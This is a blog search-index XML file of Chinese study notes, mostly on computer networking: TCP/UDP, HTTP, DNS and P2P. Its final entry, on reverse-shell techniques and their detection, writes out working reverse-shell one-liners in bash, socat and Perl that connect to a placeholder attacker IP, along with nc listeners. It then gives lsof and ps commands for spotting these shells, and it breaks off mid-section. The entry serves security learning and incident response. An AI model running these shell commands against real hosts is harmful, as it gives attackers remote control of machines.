<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2024/11/04/"/>
      <url>/2024/11/04/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>域名调整</title>
      <link href="/2024/10/12/"/>
      <url>/2024/10/12/</url>
      
        <content type="html"><![CDATA[<h1 id="新域名https-nocc-fun"><a href="#新域名https-nocc-fun" class="headerlink" title="新域名https://nocc.fun"></a>新域名<a href="https://nocc.fun">https://nocc.fun</a></h1><p>本来的域名已经做了302重定向到这里，还剩一个月解析，新域名看着舒服点</p><p>后面会有更新最近的笔记</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络运输层</title>
      <link href="/2024/06/20/"/>
      <url>/2024/06/20/</url>
      
        <content type="html"><![CDATA[<h1 id="运输层服务"><a href="#运输层服务" class="headerlink" title="运输层服务"></a>运输层服务</h1><p>运输层协议为在不同主机上的应用进程之间提供了逻辑通信功能</p><p><strong>网络层提供了主机之间的逻辑通信，而运输层为运行在不同主机上的进程之间提供了逻辑通信</strong></p><p>因特网运输层为应用层提供了UDP和TCP协议</p><p>网络层有个协议是IP协议，即网际协议</p><p>UDP和TCP最基本的责任是：将两个端系统间IP的交付服务拓展为运行在端系统上的两个进程之间的交付服务。</p><p>将主机间交付拓展到进程间交付被称为运输层的多路复用和多路分解</p><h2 id="多路复用与多路分解"><a href="#多路复用与多路分解" class="headerlink" title="多路复用与多路分解"></a>多路复用与多路分解</h2><p>将运输层报文端中的数据交付到正确的套接字工作称为<strong>多路分解</strong></p><p>在源主机从不同套接字中收集数据库，并为每个数据块封装上首部信息从而生成报文段，然后将报文段传递到网络层，所有这些工作称为<strong>多路复用</strong></p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>UDP仅仅做了运输协议的最少工作，除了复用/分解功能及少量差错检测外，几乎就没有对IP增加新的东西</p><p>使用UDP时，在发送报文段之前，没有握手，所以称UDP无连接</p><p>DNS是一个使用UDP的应用层协议的例子</p><p>使用UDP的原因：</p><ul><li>关于发送什么数据及何时发生的应用层控制更加精细</li><li>无需建立连接</li><li>无连接状态</li><li>分组首部开销小</li></ul><p><strong>UDP报文结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406201619108.jpeg" alt="UDP报文结构"></p><p>UDP校验和提供了差错校验过程</p><p>发送方的UDP对报文段中的16比特字的和进行反码运算，求和时若溢出则回卷（取反）。结果放在校验和字段</p><p>检错：接收方将全部的16比特字加在一起，如果没错，和将是<code>1111 1111 1111 1111</code>，如果有零说明错了</p><h2 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h2><p>靠理解 看书吧</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP是面向连接的，在一个进程向另一个进程发送数据之前，这两个进程必须先互相握手</p><p>TCP连接总是<strong>点对点</strong>的</p><p>三次握手机制：</p><ul><li>客户先发送一个特殊的TCP报文段</li><li>服务器用一个特殊的TCP报文段响应</li><li>客户用第三个特殊的报文段作为响应</li></ul><p>前两个报文不承载有效荷载，也就是不包含应用层数据，第三个报文可以承载有效荷载</p><p>一旦连接建立，可以互相发数据</p><p><strong>报文结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406201952288.jpeg" alt="IMG_BF169C3436CF-1"></p><p>TCP首部一般是20字节</p><p>包含：</p><ul><li>32bit序号字节和32bit确认号字节</li><li>16bit的接收窗口字节</li><li>4bit首部长度字段</li><li>可选、可变的选项字段</li><li>6bit的标志字段</li></ul><p><strong>往返时间的估计和超时</strong></p><p>估计往返时间</p><p>报文段的样本RTT（SampleRTT）就是从某报文段被发出到该报文段被确认的时间量</p><p>大多数TCP实现仅在某个时刻做一次SampleRTT测量</p><p>SampleRTT的均值称为EstimatedRTT</p><p>$\text{EstimatedRTT}=(1-\alpha)\cdot+\alpha \cdot \text{SampleRTT}$</p><p>DevRTT用于估算SampleRTT会偏离EstimatedRTT的程度</p><p>$\text{DevRTT}=(1-ß)\cdot \text{DevRTT}+ß \cdot \left|{ {\text{SampleRTT}- \text{EstimatedRTT}}}\right|$</p><p>TCP的超时间间隔用TimeoutInterval表示</p><p>$\text{TimeoutInterval} = \text{EstimatedRTT}+4 \cdot \text{DevRTT}$</p><p><strong>流量控制</strong></p><p>TCP为他的应用程序提供了流量控制服务以消除发送方使接收方缓存溢出的可能性</p><p>通过让发送方维护一个称为接收窗口的变量来提供流量控制</p><p>假设A向B建立一条TCP连接发送一个大文件，B为连接分配一个接收缓存，用RcvBuffer表示</p><p>定义以下变量</p><ul><li>LastByteRead：主机B上的应用进程从缓存独处数据流的最后一个字节的编号</li><li>LastByteRcvd：从网络中到达的并且已经放入主机B接收缓存中的数据流的最后一个字节的编号</li></ul><p>由于TCP不允许已分配的缓存溢出，则有 $\text{LastByteRcvd} - \text{LastByteRead}\leq \text{RcvBuffer}$</p><p>接收窗口用rwnd表示，根据缓存可用空间的数量来设置：$\text{rwnd}=\text{RcvBuffer} - [\text{LastByteRcvd} - \text{LastByteRead}]$</p><p><strong>关闭连接</strong></p><p>当要关闭连接时，TCP客户端向服务器进程发送一个特殊的TCP报文段，这个报文段的首部标志位即FIN比特被设置为1，然后服务器也发回一个报文，FIN比特被置为1，最后客户确认这个服务器连接都终止了</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络应用层</title>
      <link href="/2024/06/19/"/>
      <url>/2024/06/19/</url>
      
        <content type="html"><![CDATA[<blockquote><p>网络应用是计算机网络存在的理由</p></blockquote><h1 id="网络应用程序体系结构"><a href="#网络应用程序体系结构" class="headerlink" title="网络应用程序体系结构"></a>网络应用程序体系结构</h1><p><strong>客户-服务器体系结构</strong></p><p>服务器和客户端，服务器有一个固定的IP地址</p><p><strong>P2P体系结构</strong></p><p>应用程序在间断连接的主机对之间使用直接通信，这些主机被称为对等方</p><p>自拓展性</p><p><strong>进程通信</strong></p><p>进行通信的实际上是一个个进程 而非程序</p><p>进程通过套接字向网络发和接受报文</p><p><strong>可靠数据传输</strong></p><p>如果一个协议确保数据正确、完全的交付给另一端则提供了可靠数据传输</p><p><strong>因特网提供的运输服务</strong></p><ul><li>TCP服务<ul><li>面向连接的服务</li><li>可靠的数据传送服务</li><li>拥塞控制机制</li></ul></li><li>UDP服务<ul><li>提供最小服务</li><li>无连接</li><li>没有拥塞控制机制</li></ul></li></ul><p><strong>运输协议不提供的服务</strong></p><p>TCP/UDP提供了可靠数据传输、安全性，但没有对吞吐量和定时做保障</p><p><strong>应用层协议</strong></p><p>应用层协议定义了：</p><ul><li>交换的报文类型</li><li>各种报文类型的语法</li><li>字段的语义</li><li>确定一个进程何时以及如何发送报文，对报文进行响应的规则</li></ul><h1 id="Web和HTTP"><a href="#Web和HTTP" class="headerlink" title="Web和HTTP"></a>Web和HTTP</h1><p>web的应用层协议是超文本传输协议（HTTP）。http是web的核心</p><p>Web页面由对象组成，一个对象只是一个文件，图像，小程序或者视频，<strong>可通过URL寻址</strong></p><p>Web浏览器实现了HTTP的客户端，Web服务器实现了HTTP的服务器端</p><p>HTTP使用TCP作为支撑运输协议</p><p>非持续连接：每个请求经过一个单独的TCP发送</p><blockquote><p>定义往返时间RTT，即一个短分组从客户到服务器然后再返回客户的时间</p><p>RTT包括分组传播时延、分组排队时延、分组处理时延</p></blockquote><p>非持续连接消耗了2个RTT和服务器传输html的时间</p><p>持续连接：服务器在发送响应以后保持TCP连接打开。一个完整的Web页面可以用单个持续TCP连接进行传送</p><p><strong>HTTP报文格式</strong></p><p>第一行称为请求行，后继行叫做首部行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/somedir/page.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.someschool.edu</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept-language</span><span class="punctuation">: </span>fr</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>请求方法：</p><ul><li>GET</li><li>POST</li><li>HEAD</li><li>PUT</li><li>DELETE</li></ul><p>首部行后空行然后由一个<strong>实体体</strong>，这个POST用</p><p>HEAD类似GET，但响应后不返回请求的对象</p><p>PUT用于用户上传对象到指定Web服务器路径</p><p>DELETE允许用户删除Web服务器上的对象</p><p><strong>HTTP响应报文</strong></p><p>有状态行、首部行、实体体</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 18 Aug 2015 15:44:04 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.2.3 (CentOS)</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 18 Aug 2015 15:11:03 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6821</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"></span><br><span class="line"><span class="language-haskell">&#123;<span class="class"><span class="keyword">data</span>&#125;</span></span></span><br></pre></td></tr></table></figure><p>状态码：</p><ul><li>200 OK 请求成功</li><li>301 Moved Permanently 请求对象已永久转移，新URL定义在响应报文Location</li><li>400 Bad Request 请求不可被服务器理解</li><li>404 请求的文档不在服务器上</li><li>505 服务器不支持报文所使用的http协议版本</li></ul><p><strong>cookie</strong></p><blockquote><p>把内容和用户身份联系起来</p></blockquote><p>cookie技术的四个组件：</p><ul><li>http响应报文的一个Cookie首部行</li><li>http请求报文的一个Cookie首部行</li><li>在用户端系统中保留有一个cookie文件上，并由用户浏览器管理</li><li>位于Web站点的一个后端数据库</li></ul><p><strong>web缓存</strong></p><p>也叫代理服务器，能够代表初始服务器满足HTTP请求的实体</p><p>过程：</p><ul><li>浏览器创建一个到Web缓存服务器的TCP连接，并发送一个HTTP请求</li><li>web缓存服务器进行检查 是否存储这个对象副本。若有则返回</li><li>若没有，则缓存服务器打开一个与该对象的初始服务器的TCP连接，发送一个HTTP请求，初始服务器收到请求后发送具有该对象的HTTP响应</li><li>当web缓存服务器接收到对象时，在本地缓存一份副本，并向客户浏览端用HTTP响应该副本</li></ul><p>使用Web缓存服务器的优点：</p><ul><li>大大减少对客户端请求的响应时间，尤其是客户与出事服务器之间的瓶颈带宽远低于客户与Web缓存器之间的带宽瓶颈</li><li>大大减少一个机构的接入链路到因特网的通信量，降低费用</li><li>大大减低Web流量，改善所有应用的性能</li></ul><p><strong>条件GET方法</strong></p><ul><li>请求报文使用GET方法</li><li>请求报文中包含一个If-Modified-Since</li></ul><p>使得缓存器存储了最后修改的时间</p><p>若缓存了且没改动服务器返回304</p><h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><p>因特网电子邮件系统由三部分组成：</p><ul><li>用户代理（user agent）</li><li>邮件服务器（mail server）</li><li>简单邮件传输协议（SMTP）</li></ul><p>传输过程：</p><p>从发送方的用户代理开始传输到发送方的邮件服务器，再传输到接收方的邮件服务器。读邮件时要鉴别身份（用户名和口令）</p><p>若发送方服务器的邮件不能交付给接收方服务器，则发送方的邮件服务器在一个<strong>报文队列</strong>里保持这个报文，<strong>尝试再次发送</strong></p><p><strong>SMTP</strong>（推协议）</p><p>SMTP是互联网电子邮件中主要的应用层协议，使用TCP可靠数据传输服务</p><p><strong>POP3</strong>（拉协议）</p><p>邮件访问协议</p><p>按三个阶段工作：特许、事务处理、更新</p><ul><li>特许：用户代理发送用户名口令鉴别用户</li><li>事务处理：用户代理取回报文，还能对报文做删除标记、取消删除标记、获取邮件统计信息等</li><li>更新：用户发起quit命令后，结束POP3会话，此时邮件服务器会删除被标记的报文</li></ul><p><strong>IMAP</strong></p><p>IMAP也是一个邮件访问协议，IMAP服务器把每个报文与每一个文件夹联系起来；当报文第一次到达服务器时，它与收件人的INBOX关联。收件人可以把邮件移到新的用户创建的文件夹阅读和删除文件，还可以查询。</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>域名系统。互联网目录服务，将主机名（域名）映射为IP</p><ul><li>一个由分层的DNS服务器实现的分布式数据库</li><li>一个使得主机能够查询分布式数据库的应用层协议</li></ul><p>DNS服务器通常是运行BIND软件的UNIX机器</p><p>DNS协议运行在UDP之上，使用53号端口</p><p>一次解析：</p><ul><li>同一台用户主机上运行DNS客户端</li><li>浏览器从上述URL中抽出主机名，并将主机名传给DNS应用的客户端</li><li>DNS客户向DNS服务器发送一个包含主机名的请求</li><li>DNS客户最终收到一份回答报文，包含对应主机名的IP地址</li><li>一旦浏览器收到DNS的IP地址，则发起TCP连接</li></ul><p>DNS还可以提供重要服务：</p><ul><li>主机别名：让一台主机有一个或者多个别名</li><li>邮件服务器别名</li><li>负载分配</li></ul><h1 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h1><p>成对间歇连接的主机彼此之间直接通信</p><p>每个对等方能够向任何其他对等方重新分发它已经收到的该文件的任何部分</p><p>最流行的P2P文件分发协议是BitTorrent</p><p>一个例子：</p><p>服务器和对等方通过接入链路和因特网相连，其中$u_s$表示服务器接入链路的上载速率，$u_i$表示了对等方接入链路的上载速率，$d_i$表示了第i对对等方的下载速率。用F表示被分发的文件长度，用N表示要获得的该文件副本的对等方的数量。</p><p>分发时间是所有N个对等方得到该副本所需要的时间</p><p>若是客户——服务器体系结构 $D_{cs}=max\{\frac{NF}{u_s},\frac{F}{d_{min}}\}$</p><p>P2P方式，则$D_{P2P}=max\{\frac{F}{u_s},\frac{F}{d_{min}},\frac{NF}{u_s+\sum^{N}_{i=1}u_i}\}$</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406201455278.jpeg" alt="IMG_73E25CB98BEA-1"></p><p><strong>BitTorrent协议</strong></p><p>一种用于文件分发的流行的P2P协议</p><ul><li>参与一个特定文件分发的所有对等方的集合被称为一个洪流（torrent）</li><li>洪流中的对等方彼此下载等长度的文件块（chunk），256KB</li><li>每个洪流有一个基础设施节点称为追踪器（tracker）</li></ul><p><strong>最稀缺优先技术</strong></p><p>最稀缺的块是指在邻居中副本数量最少且自己也没有的块，并首先请求最稀缺的块</p><p>这样能使最稀缺块更迅速的重新分发，目标是大致均衡每个块在洪流中的副本数量</p><p><strong>视频流和内容分发网</strong></p><p>视频流知识点有</p><ul><li>HTTP流</li><li>DASH流</li></ul><p>内容分发网即CDN</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络 概论</title>
      <link href="/2024/06/18/"/>
      <url>/2024/06/18/</url>
      
        <content type="html"><![CDATA[<p>开个新坑，计网老师用的是英文ppt，所以打算看黑皮书</p><p>自己写一点理解，一共六章</p><h1 id="什么是因特网"><a href="#什么是因特网" class="headerlink" title="什么是因特网"></a>什么是因特网</h1><p>大众熟知的三种网络有：电信网络、有线电视网络、计算机网络</p><p>其中<strong>发展最快</strong>并且起到了<strong>核心作用</strong>的是<strong>计算机网络</strong></p><p>现代计算机网络则将<u>三网融合</u></p><p><strong>因特网的2个重要基本特点</strong></p><ul><li>连通性<ul><li>使上网用户之间可以非常便捷、经济地交换各种信息</li><li>使得用户终端都<strong>像</strong>彼此直接连通（实际上不一定）</li></ul></li><li>资源共享<ul><li>实现是信息共享、软件共享、硬件共享</li><li>用户能够方便地使用这些资源</li></ul></li></ul><p>以上两点是互联网提供许多服务的<strong>基础</strong></p><h2 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h2><ul><li>例如桌面PC、Linux服务器、Mac电脑，乃至智能手机、汽车等，这些设备在因特网中都称为<strong>主机或者端系统</strong></li><li><p>端系统通过通信链路和分组交换机连接在一起</p><ul><li>分组交换机：用来转发数据包，有路由器、链路层交换机等</li><li>通信链路：有光纤、铜线、无线电、卫星，传输速率用带宽（bps）体现</li></ul></li><li><p>端系统通过ISP（Internet Service Provider）接入互联网</p></li><li>端系统、分组交换机、其他部件都要运行一系列的<strong>协议</strong>，协议控制了信息的发送和接收，TCP和IP协议是两个最为重要的协议、</li><li>因特网标准：获取统一认识</li></ul><h2 id="服务描述"><a href="#服务描述" class="headerlink" title="服务描述"></a>服务描述</h2><blockquote><p>从为应用程序提供服务的基础设施的角度描述</p></blockquote><ul><li>分布式应用程序，涉及了多个互相交换数据的端系统</li></ul><blockquote><p>因特网的应用程序运行在端系统而非分组交换机</p></blockquote><ul><li>套接字接口<ul><li>一套发送程序必须遵循的规则集合</li></ul></li></ul><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p><strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送和/或接受一条报文或其他事件所采取的动作</strong></p><h1 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h1><p>如上文所说，端系统又称为主机；它们位于互联网的边缘；主机容纳应用程序。需要注意的是，主机又会进一步划分为客户端和服务端</p><h2 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h2><p>这里指将端系统物理连接到其<strong>边缘路由器</strong>的网络</p><p>有很多种接入方式：</p><p><strong>家庭接入</strong></p><ul><li>数字用户线DSL</li><li>电缆</li><li>FTTH 光纤到户 <del>感觉现在最常见吧</del></li><li>拨号</li><li>卫星</li></ul><p><strong>企业接入（家庭也能用）</strong></p><p>用局域网（LAN）将端系统接入到边缘路由器</p><ul><li>以太网</li><li>WiFi</li></ul><p><strong>广域无线接入</strong></p><ul><li>3G和LTE</li><li>4G</li><li>5G</li></ul><h2 id="物理媒介"><a href="#物理媒介" class="headerlink" title="物理媒介"></a>物理媒介</h2><ul><li>双绞铜线</li><li>同轴电缆</li><li>光纤</li><li>陆地无线电信道</li><li>卫星无线电信道</li></ul><h1 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h1><p>通过网络链路和交换机移动数据有电路交换和分组交换两种方式</p><h2 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h2><p>端系统彼此之间交换<strong>报文</strong></p><p>报文即可以执行一种控制功能，也可以包含数据</p><p>而从源到目的端系统，源将<strong>长报文</strong>划分为较小的数据块，这叫<strong>分组</strong></p><p>源和目的之间每个分组都经过<strong>通信链路</strong>和<strong>分组交换机</strong></p><p>一个L bit的分组，链路传输速度为R bit/s，则传输时间为 $\frac{L}{R}$秒</p><p><strong>存储转发传输</strong></p><p>是多数分组交换机在链路的输入端使用的机制</p><p>指在交换机能够开始向输出链路传输该分组的第一个比特之前必须接收到整个分组（缓存）</p><p>考虑由N条速率均为R的链路组成的路径，从源到目的地发送一个分组，应该能看到的端到端的时延是：$d_{端到端} = N \frac{L}{R}$</p><p>考虑P个分组的话</p><p>若串行发送：$d_{端到端}= N*P\frac{L}{R}$</p><p>若采用流水线：$d_{端到端}= (N+P-1)\frac{L}{R}$ ）</p><blockquote><p>流水线的话 上一个分组到达路由器以后下一个分组就出发了，只需要加上这段时间</p></blockquote><p><strong>排队时延和分组丢失</strong></p><p>分组交换机对于每条相连的链路会有一个输出缓存（输出队列）</p><p>显然分组传输还要承受这个缓存的<strong>排队时延</strong>（变化的，取决于网络拥塞程度）</p><p>由于缓存大小有限，当队列满时，会出现分组丢失，即丢包，这个分组即被丢弃</p><p><strong>转发表和路由选择协议</strong></p><p>端系统由IP标识</p><p>分组首部会包含一个目的地IP地址， 由路由器去转发符合的分组</p><p>每台路由器都有一个转发表，用于将目的地址映射为输出链路</p><h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>当两台主机要通信时，建立一条专用的端到端连接，会预先占用带宽</p><p>有频分复用和时分复用</p><h2 id="网络的网络"><a href="#网络的网络" class="headerlink" title="网络的网络"></a>网络的网络</h2><p>如图，端设备通过接入ISP接入互联网</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406182125308.jpeg" alt="IMG_0C178F374DCA-1"></p><h1 id="分组交换网中的时延、丢包和吞吐量"><a href="#分组交换网中的时延、丢包和吞吐量" class="headerlink" title="分组交换网中的时延、丢包和吞吐量"></a>分组交换网中的时延、丢包和吞吐量</h1><p>一个分组大概要经历如下的时延：</p><ul><li>节点处理时延：路由器检查分组首部、检错</li><li>排队时延：取决于队列长度，和流量大小相关</li><li>传输时延：将所有分组比特推向链路所需要的时间</li><li>传播时延：在链路上传播的时间</li></ul><p>这些累计在一起时节点总时延</p><p>令$d_{proc},d_{queue},d_{trans},d_{prop}$分别表示处理时延、排队时延、传输时延、传播时延，则节点总延时为：</p><p>$d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}$</p><p><strong>排队时延和丢包</strong></p><p>令a表示分组到达队列的平均速率，R是传输速率，所有分组由L比特构成</p><p>则到达队列的平均速率是La bps</p><p>$\frac{La}{R}$被称为流量强度，通常不可大于一，那会导致队列不断加长</p><p><strong>吞吐量</strong></p><p>两链路网络其吞吐量是：$min\{R_c,R_m\}$</p><p>则传输一个F bit的大文件需要$\frac{F}{min\{R_c,R_m\}}$</p><p>N条链路是同理的</p><h1 id="协议层次及服务模型"><a href="#协议层次及服务模型" class="headerlink" title="协议层次及服务模型"></a>协议层次及服务模型</h1><p><strong>分层</strong></p><p>自顶向下方法，分为五层</p><ul><li>应用层</li><li>运输层</li><li>网络层</li><li>链路层</li><li>物理层</li></ul><p>OSI模型：</p><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>运输层</li><li>网络层</li><li>链路层</li><li>物理层</li></ul><p><strong>封装</strong></p><p>一层在上一层交付的报文上添加信息</p><p>一个分组具有的字段：首部字段和有效荷载字段，其中有效荷载一般来自于上一层的分组</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell的姿势与检测</title>
      <link href="/2024/06/10/"/>
      <url>/2024/06/10/</url>
      
        <content type="html"><![CDATA[<blockquote><p>开个新坑 最近学的云安全，偏向应急响应和内网渗透</p><p>一方面是记录下云安全的学习，另一方面会记录一下应急响应的知识</p></blockquote><h1 id="CWPP"><a href="#CWPP" class="headerlink" title="CWPP"></a>CWPP</h1><blockquote><p>云负载保护平台</p><p>集成了主机安全、容器安全、网页防篡改</p><p>可以理解为linux下的监控软件</p></blockquote><h1 id="反弹shell和检测"><a href="#反弹shell和检测" class="headerlink" title="反弹shell和检测"></a>反弹shell和检测</h1><blockquote><p>下文出现的attack_ip，attack_port即监听机 用于接收反弹的shell</p><p>在RCE后，反弹shell可以帮我们拿下一台主机的权限，为后续渗透利用打下基础</p></blockquote><p>一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt; 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li><p>bash -i</p><p>bash 一个shell应用</p><p>-i 产生交互式shell</p></li><li><p>>&amp;</p><p>混合输出，将正确的，错误的结果都输出到一个地方——攻击者端</p></li><li><p>/dev/tcp/ip/port</p><p>对该文件读写建立一个socket通信</p></li><li><p>0>&amp;1</p><p>0表示输入，将Attack输入，命令执行结果为1，输出给攻击者，形成回路</p></li></ul><p>如何检测？</p><p>使⽤lsof检测，如果出现了0 1 2 ⽂件描述符的重定位，则存在反弹shell的⻛险</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -atnlp</span><br></pre></td></tr></table></figure><h2 id="多种形式"><a href="#多种形式" class="headerlink" title="多种形式"></a>多种形式</h2><h3 id="UDP-shell"><a href="#UDP-shell" class="headerlink" title="UDP shell"></a>UDP shell</h3><p>监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -u -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/udp/&lt;attack_ip&gt;/&lt;attack_port&gt; 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><blockquote><p>nc加强版</p><p>可以支持众多协议和链接方式 如 IP、TCP、 UDP、</p><p>IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket等</p><p>经过测试 是能够强交互的 能够进行vim之类的操作</p><p>这么多复现下来貌似只有这个能够强交互</p></blockquote><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 TCP-L:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure><p>反弹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;attack_ip&gt;:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure><p>ctrl + D 或者logout结束shell</p><p>需要支持的是安装socat</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y socat</span><br></pre></td></tr></table></figure><p>Socat运⾏有4个阶段：</p><ol><li>初始化阶段：将解析命令⾏并初始化⽇志系统。</li><li>打开阶段：Socat打开第⼀个地址连接，然后打开第⼆个地址连接。如果第⼀个连接失败，则会直</li></ol><p>接退出。</p><ol><li>传输阶段：Socat通过CWselect()监视，当数据在⼀侧可⽤并且可以写到另⼀侧时，socat读取它，</li></ol><p>并在需要时执⾏换⾏符转换，然后写⼊将该数据保存到另⼀个流的写⼊⽂件描述符中，然后继续等</p><p>待双向的更多数据。</p><ol><li>关闭阶段：其中⼀个连接掉开，执⾏处理另外⼀个连接。</li></ol><h4 id="检测socat-shell"><a href="#检测socat-shell" class="headerlink" title="检测socat shell"></a>检测socat shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;*u&#x27;</span></span><br><span class="line"><span class="comment">#查看socat进程</span></span><br><span class="line">ps aux|grep socat</span><br><span class="line"><span class="built_in">ls</span> -al /proc/93974/fd <span class="comment">#查看进程号具体信息</span></span><br><span class="line">lsof -n|grep 217744</span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>⽆需安装，很多系统平台上已经默认安装了perl，有⼀些WebShell⼤⻢中会集成Perl反弹Shell这也是最常⻅反弹⼿法之⼀。</p><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure><p>反弹 依赖/bin/sh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=</span></span><br><span class="line"><span class="string">&quot;&lt;attack_ip&gt;&quot;;$p=&lt;attack_port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>反弹 不依赖</p><blockquote><p>第一个是老版本 我测试下来已经不行了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>new version！</p><p>收到监听后不会回显主机名之类的</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">&#x27;$p=fork;exit,if($p);$c=IO::Socket::INET-&gt;new(PeerAddr=&gt;&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="检测-Perl-Shell"><a href="#检测-Perl-Shell" class="headerlink" title="检测 Perl Shell"></a>检测 Perl Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure><p>正常情况下就是没有，可以对比一下</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405301546502.png" alt="截屏2024-05-30 15.46.31"></p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -kf</span><br></pre></td></tr></table></figure><p>反弹 注意python3还是python</p><figure class="highlight bash"><table><tr><td 